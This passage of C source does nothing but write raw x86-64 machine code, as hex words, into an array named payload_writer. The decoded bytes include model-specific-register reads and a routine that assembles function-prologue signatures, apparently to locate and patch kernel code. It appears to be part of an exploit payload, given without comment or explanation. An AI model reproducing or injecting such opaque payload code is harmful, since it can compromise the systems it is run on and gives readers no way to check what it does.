  payload_writer[1318] = 0xffba0000;
  payload_writer[1319] = 0xe8000000;
  payload_writer[1320] = 0x00002685;
  payload_writer[1321] = 0x0c7ec085;
  payload_writer[1322] = 0x84c69848;
  payload_writer[1323] = 0x00024104;
  payload_writer[1324] = 0x08eb0000;
  payload_writer[1325] = 0x412484c6;
  payload_writer[1326] = 0x00000002;
  payload_writer[1327] = 0x24448b48;
  payload_writer[1328] = 0xed314548;
  payload_writer[1329] = 0x24748b48;
  payload_writer[1330] = 0x788d4860;
  payload_writer[1331] = 0x8515ff38;
  payload_writer[1332] = 0x8b00004a;
  payload_writer[1333] = 0x00d0249c;
  payload_writer[1334] = 0x89410000;
  payload_writer[1335] = 0x814166de;
  payload_writer[1336] = 0x66f000e6;
  payload_writer[1337] = 0x00fe8141;
  payload_writer[1338] = 0x801475a0;
  payload_writer[1339] = 0x024124bc;
  payload_writer[1340] = 0x48000000;
  payload_writer[1341] = 0x4124848d;
  payload_writer[1342] = 0x4c000002;
  payload_writer[1343] = 0x48e8450f;
  payload_writer[1344] = 0x1024848b;
  payload_writer[1345] = 0x8b000001;
  payload_writer[1346] = 0x0094248c;
  payload_writer[1347] = 0x8c390000;
  payload_writer[1348] = 0x0000b824;
  payload_writer[1349] = 0xbc8b4400;
  payload_writer[1350] = 0x00009024;
  payload_writer[1351] = 0x44894800;
  payload_writer[1352] = 0x848b3824;
  payload_writer[1353] = 0x00008c24;
  payload_writer[1354] = 0x0d8b4c00;
  payload_writer[1355] = 0x000048d8;
  payload_writer[1356] = 0x68244489;
  payload_writer[1357] = 0x8b442775;
  payload_writer[1358] = 0x00842484;
  payload_writer[1359] = 0x8d480000;
  payload_writer[1360] = 0x003a9a15;
  payload_writer[1361] = 0x248c8b00;
  payload_writer[1362] = 0x00000088;
  payload_writer[1363] = 0x000006be;
  payload_writer[1364] = 0x7c8b4800;
  payload_writer[1365] = 0xc0310824;
  payload_writer[1366] = 0xebd1ff41;
  payload_writer[1367] = 0x7c8b481c;
  payload_writer[1368] = 0xc1810824;
  payload_writer[1369] = 0x0000076c;
  payload_writer[1370] = 0x7a158d48;
  payload_writer[1371] = 0xbe00003a;
  payload_writer[1372] = 0x00000006;
  payload_writer[1373] = 0xff41c031;
  payload_writer[1374] = 0x058b48d1;
  payload_writer[1375] = 0x00004888;
  payload_writer[1376] = 0xfe814166;
  payload_writer[1377] = 0x8948a000;
  payload_writer[1378] = 0x75402444;
  payload_writer[1379] = 0x7d80410b;
  payload_writer[1380] = 0x850f0000;
  payload_writer[1381] = 0x0000017e;
  payload_writer[1382] = 0xb9f88944;
  payload_writer[1383] = 0x0000000c;
  payload_writer[1384] = 0x48f9f799;
  payload_writer[1385] = 0x3b96058d;
  payload_writer[1386] = 0xc3f60000;
  payload_writer[1387] = 0xd2634801;
  payload_writer[1388] = 0x90048d48;
  payload_writer[1389] = 0x24448948;
  payload_writer[1390] = 0x45147458;
  payload_writer[1391] = 0x4166db31;
  payload_writer[1392] = 0x4000fe81;
  payload_writer[1393] = 0xc3950f41;
  payload_writer[1394] = 0x9b5c8d47;
  payload_writer[1395] = 0x6615eb73;
  payload_writer[1396] = 0x00fe8141;
  payload_writer[1397] = 0x002db840;
  payload_writer[1398] = 0xbb410000;
  payload_writer[1399] = 0x00000053;
  payload_writer[1400] = 0xd8450f44;
  payload_writer[1401] = 0xe083d889;
  payload_writer[1402] = 0xf8836602;
  payload_writer[1403] = 0x45d88901;
  payload_writer[1404] = 0xe083c919;
  payload_writer[1405] = 0xe1834104;
  payload_writer[1406] = 0xc18341b6;
  payload_writer[1407] = 0xf8836677;
  payload_writer[1408] = 0x83d21901;
  payload_writer[1409] = 0xc283bbe2;
  payload_writer[1410] = 0x08c3f672;
  payload_writer[1411] = 0x31451474;
  payload_writer[1412] = 0x814166d2;
  payload_writer[1413] = 0x414000fe;
  payload_writer[1414] = 0x47c2950f;
  payload_writer[1415] = 0x7392548d;
  payload_writer[1416] = 0x416615eb;
  payload_writer[1417] = 0x4000fe81;
  payload_writer[1418] = 0x00002db8;
  payload_writer[1419] = 0x53ba4100;
  payload_writer[1420] = 0x44000000;
  payload_writer[1421] = 0x89d0450f;
  payload_writer[1422] = 0x10e083d8;
  payload_writer[1423] = 0x01f88366;
  payload_writer[1424] = 0x1945d889;
  payload_writer[1425] = 0x20e083ff;
  payload_writer[1426] = 0xb6e78341;
  payload_writer[1427] = 0x77c78341;
  payload_writer[1428] = 0x01f88366;
  payload_writer[1429] = 0x41ed1945;
  payload_writer[1430] = 0x41bbe583;
  payload_writer[1431] = 0xf672c583;
  payload_writer[1432] = 0x127440c3;
  payload_writer[1433] = 0x4166f631;
  payload_writer[1434] = 0x4000fe81;
  payload_writer[1435] = 0xc6950f40;
  payload_writer[1436] = 0x73b6748d;
  payload_writer[1437] = 0x416613eb;
  payload_writer[1438] = 0x4000fe81;
  payload_writer[1439] = 0x00002db8;
  payload_writer[1440] = 0x0053be00;
  payload_writer[1441] = 0x450f0000;
  payload_writer[1442] = 0x0fd889f0;
  payload_writer[1443] = 0x2566fbb7;
  payload_writer[1444] = 0x54890080;
  payload_writer[1445] = 0x83666c24;
  payload_writer[1446] = 0xd88901f8;
  payload_writer[1447] = 0x66f61945;
  payload_writer[1448] = 0x41010025;
  payload_writer[1449] = 0x41b6e683;
  payload_writer[1450] = 0x6677c683;
  payload_writer[1451] = 0x4501f883;
  payload_writer[1452] = 0x8341c019;
  payload_writer[1453] = 0x8341bbe0;
  payload_writer[1454] = 0xbbe872c0;
  payload_writer[1455] = 0x48ffffec;
  payload_writer[1456] = 0x4024bc8d;
  payload_writer[1457] = 0xff000003;
  payload_writer[1458] = 0x0f302474;
  payload_writer[1459] = 0x74ffc8be;
  payload_writer[1460] = 0x448b1024;
  payload_writer[1461] = 0xff507824;
  payload_writer[1462] = 0xff702474;
  payload_writer[1463] = 0x41582474;
  payload_writer[1464] = 0x8b514153;
  payload_writer[1465] = 0x00a42494;
  payload_writer[1466] = 0x89450000;
  payload_writer[1467] = 0x52c031f1;
  payload_writer[1468] = 0x57415241;
  payload_writer[1469] = 0x48565541;
  payload_writer[1470] = 0xa0249c8b;
  payload_writer[1471] = 0x48000000;
  payload_writer[1472] = 0x38e8158d;
  payload_writer[1473] = 0x00be0000;
  payload_writer[1474] = 0xff000002;
  payload_writer[1475] = 0xc48348d3;
  payload_writer[1476] = 0x0130e960;
  payload_writer[1477] = 0x89440000;
  payload_writer[1478] = 0x000cb9f8;
  payload_writer[1479] = 0x0f990000;
  payload_writer[1480] = 0xf9f7fbb7;
  payload_writer[1481] = 0x15058d48;
  payload_writer[1482] = 0x4800003a;
  payload_writer[1483] = 0x8d48d263;
  payload_writer[1484] = 0x89489004;
  payload_writer[1485] = 0x89582444;
  payload_writer[1486] = 0x01e083d8;
  payload_writer[1487] = 0x01f88366;
  payload_writer[1488] = 0xc919d889;
  payload_writer[1489] = 0x8302e083;
  payload_writer[1490] = 0xc183b5e1;
  payload_writer[1491] = 0xf8836678;
  payload_writer[1492] = 0x89d21901;
  payload_writer[1493] = 0xb6e283d8;
  payload_writer[1494] = 0x8304e083;
  payload_writer[1495] = 0x836677c2;
  payload_writer[1496] = 0x194501f8;
  payload_writer[1497] = 0x41d889ff;
  payload_writer[1498] = 0x83bbe783;
  payload_writer[1499] = 0x834108e0;
  payload_writer[1500] = 0x836672c7;
  payload_writer[1501] = 0x194501f8;
  payload_writer[1502] = 0x41d889f6;
  payload_writer[1503] = 0x83b5e683;
  payload_writer[1504] = 0x834110e0;
  payload_writer[1505] = 0x836678c6;
  payload_writer[1506] = 0x194501f8;
  payload_writer[1507] = 0x41d889db;
  payload_writer[1508] = 0x83b6e383;
  payload_writer[1509] = 0x834120e0;
  payload_writer[1510] = 0x836677c3;
  payload_writer[1511] = 0x194501f8;
  payload_writer[1512] = 0x41d889d2;
  payload_writer[1513] = 0x83bbe283;
  payload_writer[1514] = 0x834140e0;
  payload_writer[1515] = 0x836672c2;
  payload_writer[1516] = 0xf61901f8;
  payload_writer[1517] = 0xe683d889;
  payload_writer[1518] = 0x802566b5;
  payload_writer[1519] = 0x78c68300;
  payload_writer[1520] = 0x01f88366;
  payload_writer[1521] = 0x89c91945;
  payload_writer[1522] = 0xe18341d8;
  payload_writer[1523] = 0x002566b6;
  payload_writer[1524] = 0xc1834101;
  payload_writer[1525] = 0xf8836677;
  payload_writer[1526] = 0xc0194501;
  payload_writer[1527] = 0x6c245489;
  payload_writer[1528] = 0xbbe08341;
  payload_writer[1529] = 0x72c08341;
  payload_writer[1530] = 0xffeb8de8;
  payload_writer[1531] = 0xbc8d48ff;
  payload_writer[1532] = 0x00034024;
  payload_writer[1533] = 0x55415200;
  payload_writer[1534] = 0x402474ff;
  payload_writer[1535] = 0x202474ff;
  payload_writer[1536] = 0x8824948b;
  payload_writer[1537] = 0x0f000000;
  payload_writer[1538] = 0xff52c0be;
  payload_writer[1539] = 0x008024b4;
  payload_writer[1540] = 0x74ff0000;
  payload_writer[1541] = 0x8b516824;
  payload_writer[1542] = 0x00ac2494;
  payload_writer[1543] = 0xc1890000;
  payload_writer[1544] = 0x4152c031;
  payload_writer[1545] = 0x41564157;
  payload_writer[1546] = 0x56524153;
  payload_writer[1547] = 0x249c8b48;
  payload_writer[1548] = 0x000000b0;
  payload_writer[1549] = 0xe6158d48;
  payload_writer[1550] = 0xbe000037;
  payload_writer[1551] = 0x00000200;
  payload_writer[1552] = 0x8348d3ff;
  payload_writer[1553] = 0x8d4870c4;
  payload_writer[1554] = 0x0340249c;
  payload_writer[1555] = 0x89480000;
  payload_writer[1556] = 0xde8948ef;
  payload_writer[1557] = 0xfff12de8;
  payload_writer[1558] = 0x0200baff;
  payload_writer[1559] = 0xf6310000;
  payload_writer[1560] = 0xffdf8948;
  payload_writer[1561] = 0x0046b715;
  payload_writer[1562] = 0xb70f4100;
  payload_writer[1563] = 0x49042444;
  payload_writer[1564] = 0xace9c401;
  payload_writer[1565] = 0x48fffffb;
  payload_writer[1566] = 0x1024548b;
  payload_writer[1567] = 0x8b48f631;
  payload_writer[1568] = 0x15ff243c;
  payload_writer[1569] = 0x00004698;
  payload_writer[1570] = 0xfffb6ee9;
  payload_writer[1571] = 0x247c8bff;
  payload_writer[1572] = 0x226fe828;
  payload_writer[1573] = 0x8b480000;
  payload_writer[1574] = 0x15ff243c;
  payload_writer[1575] = 0x00004720;
  payload_writer[1576] = 0xe8ef8948;
  payload_writer[1577] = 0xffffeaad;
  payload_writer[1578] = 0xab3d8d48;
  payload_writer[1579] = 0x48000037;
  payload_writer[1580] = 0x44621d8b;
  payload_writer[1581] = 0x15ff0000;
  payload_writer[1582] = 0x000046e4;
  payload_writer[1583] = 0x31107d8b;
  payload_writer[1584] = 0xc28948c9;
  payload_writer[1585] = 0x8f358d48;
  payload_writer[1586] = 0xff000037;
  payload_writer[1587] = 0xc48148d3;
  payload_writer[1588] = 0x00000548;
  payload_writer[1589] = 0x5c415d5b;
  payload_writer[1590] = 0x5e415d41;
  payload_writer[1591] = 0x55c35f41;
  payload_writer[1592] = 0xec814853;
  payload_writer[1593] = 0x00000188;
  payload_writer[1594] = 0x48fb8948;
  payload_writer[1595] = 0x0258bf8b;
  payload_writer[1596] = 0x85480000;
  payload_writer[1597] = 0x483274ff;
  payload_writer[1598] = 0x8124ac8d;
  payload_writer[1599] = 0x31000000;
  payload_writer[1600] = 0xea8948c0;
  payload_writer[1601] = 0x16358d48;
  payload_writer[1602] = 0xff000035;
  payload_writer[1603] = 0x0045c715;
  payload_writer[1604] = 0x7ec08500;
  payload_writer[1605] = 0x748d4814;
  payload_writer[1606] = 0x89480824;
  payload_writer[1607] = 0x227fe8ef;
  payload_writer[1608] = 0x89480000;
  payload_writer[1609] = 0x79c085ee;
  payload_writer[1610] = 0xb38d4807;
  payload_writer[1611] = 0x00000260;
  payload_writer[1612] = 0xe8df8948;
  payload_writer[1613] = 0xfffff9ac;
  payload_writer[1614] = 0x88c48148;
  payload_writer[1615] = 0x5b000001;
  payload_writer[1616] = 0x5355c35d;
  payload_writer[1617] = 0x88ec8148;
  payload_writer[1618] = 0xba000001;
  payload_writer[1619] = 0x000000ff;
  payload_writer[1620] = 0x24ac8d48;
  payload_writer[1621] = 0x00000081;
  payload_writer[1622] = 0x48fb8948;
  payload_writer[1623] = 0x70e8ee89;
  payload_writer[1624] = 0x48fffff5;
  payload_writer[1625] = 0x0824748d;
  payload_writer[1626] = 0xe8ef8948;
  payload_writer[1627] = 0x00002231;
  payload_writer[1628] = 0x2579c085;
  payload_writer[1629] = 0x6e3d8d48;
  payload_writer[1630] = 0x48000035;
  payload_writer[1631] = 0x43962d8b;
  payload_writer[1632] = 0x15ff0000;
  payload_writer[1633] = 0x00004618;
  payload_writer[1634] = 0x31107b8b;
  payload_writer[1635] = 0xc28948c9;
  payload_writer[1636] = 0x52358d48;
  payload_writer[1637] = 0xeb000035;
  payload_writer[1638] = 0xee894833;
  payload_writer[1639] = 0x5fbb8d48;
  payload_writer[1640] = 0xff000003;
  payload_writer[1641] = 0x00444715;
  payload_writer[1642] = 0x3d8d4800;
  payload_writer[1643] = 0x000036c3;
  payload_writer[1644] = 0x612d8b48;
  payload_writer[1645] = 0xff000043;
  payload_writer[1646] = 0x0045e315;
  payload_writer[1647] = 0x107b8b00;
  payload_writer[1648] = 0x8948c931;
  payload_writer[1649] = 0x358d48c2;
  payload_writer[1650] = 0x000036a7;
  payload_writer[1651] = 0x8148d5ff;
  payload_writer[1652] = 0x000188c4;
  payload_writer[1653] = 0xc35d5b00;
  payload_writer[1654] = 0x46153d83;
  payload_writer[1655] = 0x0f000000;
  payload_writer[1656] = 0x0000d484;
  payload_writer[1657] = 0xf13d8b00;
  payload_writer[1658] = 0x41000045;
  payload_writer[1659] = 0x55f63154;
  payload_writer[1660] = 0x8915ff53;
  payload_writer[1661] = 0x8b000043;
  payload_writer[1662] = 0x0045df3d;
  payload_writer[1663] = 0x2d15ff00;
  payload_writer[1664] = 0x48000043;
  payload_writer[1665] = 0x45d63d8b;
  payload_writer[1666] = 0xf6310000;
  payload_writer[1667] = 0x43c615ff;
  payload_writer[1668] = 0x8d480000;
  payload_writer[1669] = 0x0045af3d;
  payload_writer[1670] = 0xc915ff00;
  payload_writer[1671] = 0x48000043;
  payload_writer[1672] = 0x45aa1d8b;
  payload_writer[1673] = 0x85480000;
  payload_writer[1674] = 0x8b5174db;
  payload_writer[1675] = 0x01be107b;
  payload_writer[1676] = 0x48000000;
  payload_writer[1677] = 0x0460ab8b;
  payload_writer[1678] = 0x8b4c0000;
  payload_writer[1679] = 0x15ff0863;
  payload_writer[1680] = 0x0000433c;
  payload_writer[1681] = 0x00187b83;
  payload_writer[1682] = 0x7b8b2274;
  payload_writer[1683] = 0x0003be14;
  payload_writer[1684] = 0x15ff0000;
  payload_writer[1685] = 0x00004328;
  payload_writer[1686] = 0x02187b83;
  payload_writer[1687] = 0x7b8b0e75;
  payload_writer[1688] = 0x0003be3c;
  payload_writer[1689] = 0x15ff0000;
  payload_writer[1690] = 0x00004314;
  payload_writer[1691] = 0x894cf631;
  payload_writer[1692] = 0xeb8948e7;
  payload_writer[1693] = 0x435e15ff;
  payload_writer[1694] = 0xaaeb0000;
  payload_writer[1695] = 0x453d8d48;
  payload_writer[1696] = 0xff000045;
  payload_writer[1697] = 0x00433f15;
  payload_writer[1698] = 0x3d8b4800;
  payload_writer[1699] = 0x00004538;
  payload_writer[1700] = 0x42f215ff;
  payload_writer[1701] = 0x485b0000;
  payload_writer[1702] = 0x452e05c7;
  payload_writer[1703] = 0x00000000;
  payload_writer[1704] = 0xc75d0000;
  payload_writer[1705] = 0x00452b05;
  payload_writer[1706] = 0x00000000;
  payload_writer[1707] = 0x3d05c700;
  payload_writer[1708] = 0x00000045;
  payload_writer[1709] = 0x41000000;
  payload_writer[1710] = 0x8d48c35c;
  payload_writer[1711] = 0x00453f15;
  payload_writer[1712] = 0x48c03100;
  payload_writer[1713] = 0x7a83d189;
  payload_writer[1714] = 0x1d750010;
  payload_writer[1715] = 0x6b489848;
  payload_writer[1716] = 0x014818c0;
  payload_writer[1717] = 0x388948c8;
  payload_writer[1718] = 0x08708948;
  payload_writer[1719] = 0x011040c7;
  payload_writer[1720] = 0xb8000000;
  payload_writer[1721] = 0x00000001;
  payload_writer[1722] = 0x48c0ffc3;
  payload_writer[1723] = 0x8318c283;
  payload_writer[1724] = 0xd27520f8;
  payload_writer[1725] = 0x53c3c031;
  payload_writer[1726] = 0x44f61d8b;
  payload_writer[1727] = 0xdb850000;
  payload_writer[1728] = 0x023a850f;
  payload_writer[1729] = 0xf0890000;
  payload_writer[1730] = 0xdd158d48;
  payload_writer[1731] = 0x48000044;
  payload_writer[1732] = 0x05c7fe89;
  payload_writer[1733] = 0x000044d4;
  payload_writer[1734] = 0x00000200;
  payload_writer[1735] = 0x000002bf;
  payload_writer[1736] = 0x05896600;
  payload_writer[1737] = 0x000044c0;
  payload_writer[1738] = 0x41d215ff;
  payload_writer[1739] = 0x8d480000;
  payload_writer[1740] = 0x00356615;
  payload_writer[1741] = 0x48f63100;
  payload_writer[1742] = 0x448a3d8d;
  payload_writer[1743] = 0x15ff0000;
  payload_writer[1744] = 0x0000427c;
  payload_writer[1745] = 0x8d48c031;
  payload_writer[1746] = 0x0044c315;
  payload_writer[1747] = 0x0204c700;
  payload_writer[1748] = 0x00000000;
  payload_writer[1749] = 0x18c08348;
  payload_writer[1750] = 0x03003d48;
  payload_writer[1751] = 0xe6750000;
  payload_writer[1752] = 0x9e358d48;
  payload_writer[1753] = 0x48ffffe4;
  payload_writer[1754] = 0x35453d8d;
  payload_writer[1755] = 0x47e80000;
  payload_writer[1756] = 0x48ffffff;
  payload_writer[1757] = 0xe4bd358d;
  payload_writer[1758] = 0x8d48ffff;
  payload_writer[1759] = 0x0035373d;
  payload_writer[1760] = 0xff34e800;
  payload_writer[1761] = 0x8d48ffff;
  payload_writer[1762] = 0xffe4dc35;
  payload_writer[1763] = 0x3d8d48ff;
  payload_writer[1764] = 0x00003529;
  payload_writer[1765] = 0xffff21e8;
  payload_writer[1766] = 0x358d48ff;
  payload_writer[1767] = 0xffffe4fb;
  payload_writer[1768] = 0x1b3d8d48;
  payload_writer[1769] = 0xe8000035;
  payload_writer[1770] = 0xffffff0e;
  payload_writer[1771] = 0x1a358d48;
  payload_writer[1772] = 0x48ffffe5;
  payload_writer[1773] = 0x350d3d8d;
  payload_writer[1774] = 0xfbe80000;
  payload_writer[1775] = 0x48fffffe;
  payload_writer[1776] = 0xe539358d;
  payload_writer[1777] = 0x8d48ffff;
  payload_writer[1778] = 0x0034ff3d;
  payload_writer[1779] = 0xfee8e800;
  payload_writer[1780] = 0x8d48ffff;
  payload_writer[1781] = 0xffe63935;
  payload_writer[1782] = 0x3d8d48ff;
  payload_writer[1783] = 0x000034f1;
  payload_writer[1784] = 0xfffed5e8;
  payload_writer[1785] = 0x358d48ff;
  payload_writer[1786] = 0xfffffcf3;
  payload_writer[1787] = 0xe33d8d48;
  payload_writer[1788] = 0xe8000034;
  payload_writer[1789] = 0xfffffec2;
  payload_writer[1790] = 0xc3358d48;
  payload_writer[1791] = 0x48ffffe7;
  payload_writer[1792] = 0x34d53d8d;
  payload_writer[1793] = 0xafe80000;
  payload_writer[1794] = 0x48fffffe;
  payload_writer[1795] = 0xf11a358d;
  payload_writer[1796] = 0x8d48ffff;
  payload_writer[1797] = 0x0034c63d;
  payload_writer[1798] = 0xfe9ce800;
  payload_writer[1799] = 0x8d48ffff;
  payload_writer[1800] = 0xffe7f835;
  payload_writer[1801] = 0x3d8d48ff;
  payload_writer[1802] = 0x000034b7;
  payload_writer[1803] = 0xfffe89e8;
  payload_writer[1804] = 0x358d48ff;
  payload_writer[1805] = 0xfffff0b6;
  payload_writer[1806] = 0xa93d8d48;
  payload_writer[1807] = 0xe8000034;
  payload_writer[1808] = 0xfffffe76;
  payload_writer[1809] = 0x29358d48;
  payload_writer[1810] = 0x48fffff4;
  payload_writer[1811] = 0x349b3d8d;
  payload_writer[1812] = 0x63e80000;
  payload_writer[1813] = 0x48fffffe;
  payload_writer[1814] = 0xf35e358d;
  payload_writer[1815] = 0x8d48ffff;
  payload_writer[1816] = 0x00348d3d;
  payload_writer[1817] = 0xfe50e800;
  payload_writer[1818] = 0x8d48ffff;
  payload_writer[1819] = 0xfff43635;
  payload_writer[1820] = 0x3d8d48ff;
  payload_writer[1821] = 0x0000347f;
  payload_writer[1822] = 0xfffe3de8;
  payload_writer[1823] = 0x358d48ff;
  payload_writer[1824] = 0xfffff5b8;
  payload_writer[1825] = 0x713d8d48;
  payload_writer[1826] = 0xe8000034;
  payload_writer[1827] = 0xfffffe2a;
  payload_writer[1828] = 0x2a358d48;
  payload_writer[1829] = 0x48fffff5;
  payload_writer[1830] = 0x34623d8d;
  payload_writer[1831] = 0x17e80000;
  payload_writer[1832] = 0x48fffffe;
  payload_writer[1833] = 0xfc98358d;
  payload_writer[1834] = 0x8d48ffff;
  payload_writer[1835] = 0x0034533d;
  payload_writer[1836] = 0xfe04e800;
  payload_writer[1837] = 0x8d48ffff;
  payload_writer[1838] = 0xfff33235;
  payload_writer[1839] = 0x3d8d48ff;
  payload_writer[1840] = 0x00003445;
  payload_writer[1841] = 0xfffdf1e8;
  payload_writer[1842] = 0x358d48ff;
  payload_writer[1843] = 0xfffff44d;
  payload_writer[1844] = 0x373d8d48;
  payload_writer[1845] = 0xe8000034;
  payload_writer[1846] = 0xfffffdde;
  payload_writer[1847] = 0xd9358d48;
  payload_writer[1848] = 0x48ffffe7;
  payload_writer[1849] = 0x34293d8d;
  payload_writer[1850] = 0xcbe80000;
  payload_writer[1851] = 0x48fffffd;
  payload_writer[1852] = 0xe82a358d;
  payload_writer[1853] = 0x8d48ffff;
  payload_writer[1854] = 0x00341b3d;
  payload_writer[1855] = 0xfdb8e800;
  payload_writer[1856] = 0x8d48ffff;
  payload_writer[1857] = 0xfff27635;
  payload_writer[1858] = 0x3d8d48ff;
  payload_writer[1859] = 0x0000340d;
  payload_writer[1860] = 0xfffda5e8;
  payload_writer[1861] = 0x058d4cff;
  payload_writer[1862] = 0x00003406;
  payload_writer[1863] = 0x8d48c931;
  payload_writer[1864] = 0xffea5715;
  payload_writer[1865] = 0x48f631ff;
  payload_writer[1866] = 0x42b23d8d;
  payload_writer[1867] = 0x15ff0000;
  payload_writer[1868] = 0x000040ac;
  payload_writer[1869] = 0x42b605c7;
  payload_writer[1870] = 0x00010000;
  payload_writer[1871] = 0x03eb0000;
  payload_writer[1872] = 0x89ffcb83;
  payload_writer[1873] = 0x41c35bd8;
  payload_writer[1874] = 0x49544155;
  payload_writer[1875] = 0x5355fd89;
  payload_writer[1876] = 0x4851db31;
  payload_writer[1877] = 0x4c18c36b;
  payload_writer[1878] = 0x42a2258d;
  payload_writer[1879] = 0x894c0000;
  payload_writer[1880] = 0xeb6348ef;
  payload_writer[1881] = 0x04348b49;
  payload_writer[1882] = 0x41e215ff;
  payload_writer[1883] = 0xc0850000;
  payload_writer[1884] = 0x6b481475;
  payload_writer[1885] = 0x01b818ed;
  payload_writer[1886] = 0x41000000;
  payload_writer[1887] = 0x102c44c7;
  payload_writer[1888] = 0x00000000;
  payload_writer[1889] = 0xff480beb;
  payload_writer[1890] = 0xfb8348c3;
  payload_writer[1891] = 0x31c47520;
  payload_writer[1892] = 0x5d5b5ac0;
  payload_writer[1893] = 0x5d415c41;
  payload_writer[1894] = 0x485355c3;
  payload_writer[1895] = 0x4818ec83;
  payload_writer[1896] = 0x3f721d8b;
  payload_writer[1897] = 0x89480000;
  payload_writer[1898] = 0x748948fd;
  payload_writer[1899] = 0x89480824;
  payload_writer[1900] = 0xe915fff7;
  payload_writer[1901] = 0x8b000041;
  payload_writer[1902] = 0xc931107d;
  payload_writer[1903] = 0x24748b48;
  payload_writer[1904] = 0xc4834808;
  payload_writer[1905] = 0xc2894818;
  payload_writer[1906] = 0x5bd88948;
  payload_writer[1907] = 0xe9e0ff5d;
  payload_writer[1908] = 0xfffff0ff;
  payload_writer[1909] = 0xffed8ce9;
  payload_writer[1910] = 0x555441ff;
  payload_writer[1911] = 0x0082b953;
  payload_writer[1912] = 0x8148c000;
  payload_writer[1913] = 0x000130ec;
  payload_writer[1914] = 0xf5894800;
  payload_writer[1915] = 0xc148320f;
  payload_writer[1916] = 0xc74820e2;
  payload_writer[1917] = 0x66382444;
  payload_writer[1918] = 0x48000006;
  payload_writer[1919] = 0x44c6d009;
  payload_writer[1920] = 0xc67f1024;
  payload_writer[1921] = 0x45112444;
  payload_writer[1922] = 0x24748d48;
  payload_writer[1923] = 0x2444c610;
  payload_writer[1924] = 0x8d484c12;
  payload_writer[1925] = 0xfffe40b8;
  payload_writer[1926] = 0x2444c6ff;
  payload_writer[1927] = 0x04ba4613;
  payload_writer[1928] = 0x48000000;
  payload_writer[1929] = 0x08244c89;
  payload_writer[1930] = 0x40a215ff;
  payload_writer[1931] = 0x8b4c0000;
  payload_writer[1932] = 0x00409b05;
  payload_writer[1933] = 0x48c08500;
  payload_writer[1934] = 0x08244c8b;
  payload_writer[1935] = 0x0589850f;
  payload_writer[1936] = 0x320f0000;
  payload_writer[1937] = 0x20e2c148;
  payload_writer[1938] = 0x402444c6;
  payload_writer[1939] = 0xd3894855;
  payload_writer[1940] = 0x412444c6;
  payload_writer[1941] = 0xc3094848;
  payload_writer[1942] = 0x422444c6;
  payload_writer[1943] = 0x2444c689;
  payload_writer[1944] = 0x8d48e543;
  payload_writer[1945] = 0xc6402474;
  payload_writer[1946] = 0x53442444;
  payload_writer[1947] = 0x70bb8d48;
  payload_writer[1948] = 0xc6000bc5;
  payload_writer[1949] = 0x48452444;
  payload_writer[1950] = 0x00000cba;
  payload_writer[1951] = 0x2444c600;
  payload_writer[1952] = 0x8d4c8346;
  payload_writer[1953] = 0xfffe40a3;
  payload_writer[1954] = 0x2444c6ff;
  payload_writer[1955] = 0x44c6ec47;
  payload_writer[1956] = 0xc6584824;
  payload_writer[1957] = 0x48492444;
  payload_writer[1958] = 0x4a2444c6;
  payload_writer[1959] = 0x2444c68d;
  payload_writer[1960] = 0xff411d4b;
  payload_writer[1961] = 0x75c085d0;
  payload_writer[1962] = 0x44c74815;
  payload_writer[1963] = 0x07003824;
  payload_writer[1964] = 0x8d480000;
  payload_writer[1965] = 0x02ef8083;
  payload_writer[1966] = 0x0d4ee900;
  payload_writer[1967] = 0x44c60000;
  payload_writer[1968] = 0x48554c24;
  payload_writer[1969] = 0x4c24748d;
  payload_writer[1970] = 0x4d2444c6;
  payload_writer[1971] = 0xbb8d4848;
  payload_writer[1972] = 0x001230c0;
  payload_writer[1973] = 0x4e2444c6;
  payload_writer[1974] = 0x000cba89;
  payload_writer[1975] = 0x44c60000;
  payload_writer[1976] = 0xc6e54f24;
  payload_writer[1977] = 0x53502444;
  payload_writer[1978] = 0x512444c6;
  payload_writer[1979] = 0x2444c648;
  payload_writer[1980] = 0x44c68352;
  payload_writer[1981] = 0xc6ec5324;
  payload_writer[1982] = 0x58542444;
  payload_writer[1983] = 0x552444c6;
  payload_writer[1984] = 0x2444c648;
  payload_writer[1985] = 0x44c68d56;
  payload_writer[1986] = 0xff1d5724;
  payload_writer[1987] = 0x003fbf15;
  payload_writer[1988] = 0x75c08500;
  payload_writer[1989] = 0x44c74815;
  payload_writer[1990] = 0x06703824;
  payload_writer[1991] = 0x8d480000;
  payload_writer[1992] = 0x3c14f083;
  payload_writer[1993] = 0x0ce2e900;
  payload_writer[1994] = 0x44c60000;
  payload_writer[1995] = 0x48555824;
  payload_writer[1996] = 0x5824748d;
  payload_writer[1997] = 0x592444c6;
  payload_writer[1998] = 0xbb8d4848;
  payload_writer[1999] = 0x00122d10;
  payload_writer[2000] = 0x5a2444c6;
  payload_writer[2001] = 0x000cba89;
  payload_writer[2002] = 0x44c60000;
  payload_writer[2003] = 0xc6e55b24;
  payload_writer[2004] = 0x535c2444;
  payload_writer[2005] = 0x5d2444c6;
  payload_writer[2006] = 0x2444c648;
  payload_writer[2007] = 0x44c6835e;
  payload_writer[2008] = 0xc6ec5f24;
  payload_writer[2009] = 0x58602444;
  payload_writer[2010] = 0x612444c6;
  payload_writer[2011] = 0x2444c648;
  payload_writer[2012] = 0x44c68d62;
  payload_writer[2013] = 0xff1d6324;
  payload_writer[2014] = 0x003f5315;
  payload_writer[2015] = 0x75c08500;
  payload_writer[2016] = 0x44c74815;
  payload_writer[2017] = 0x06503824;
  payload_writer[2018] = 0x8d480000;
  payload_writer[2019] = 0x3c114083;
  payload_writer[2020] = 0x0c76e900;
  payload_writer[2021] = 0x44c60000;
  payload_writer[2022] = 0x48556424;
  payload_writer[2023] = 0x6424748d;
  payload_writer[2024] = 0x652444c6;
  payload_writer[2025] = 0xbb8d4848;
  payload_writer[2026] = 0x00307c50;
  payload_writer[2027] = 0x662444c6;
  payload_writer[2028] = 0x000cba89;
  payload_writer[2029] = 0x44c60000;
  payload_writer[2030] = 0xc6e56724;
  payload_writer[2031] = 0x53682444;
  payload_writer[2032] = 0x692444c6;
  payload_writer[2033] = 0x2444c648;
  payload_writer[2034] = 0x44c6836a;
  payload_writer[2035] = 0xc6ec6b24;
  payload_writer[2036] = 0x586c2444;
  payload_writer[2037] = 0x6d2444c6;
  payload_writer[2038] = 0x2444c648;
  payload_writer[2039] = 0x44c68d6e;
  payload_writer[2040] = 0xff1d6f24;
  payload_writer[2041] = 0x003ee715;
  payload_writer[2042] = 0x75c08500;
  payload_writer[2043] = 0x44c7480b;
  payload_writer[2044] = 0x06203824;
  payload_writer[2045] = 0x60eb0000;
  payload_writer[2046] = 0x702444c6;
  payload_writer[2047] = 0x748d4855;
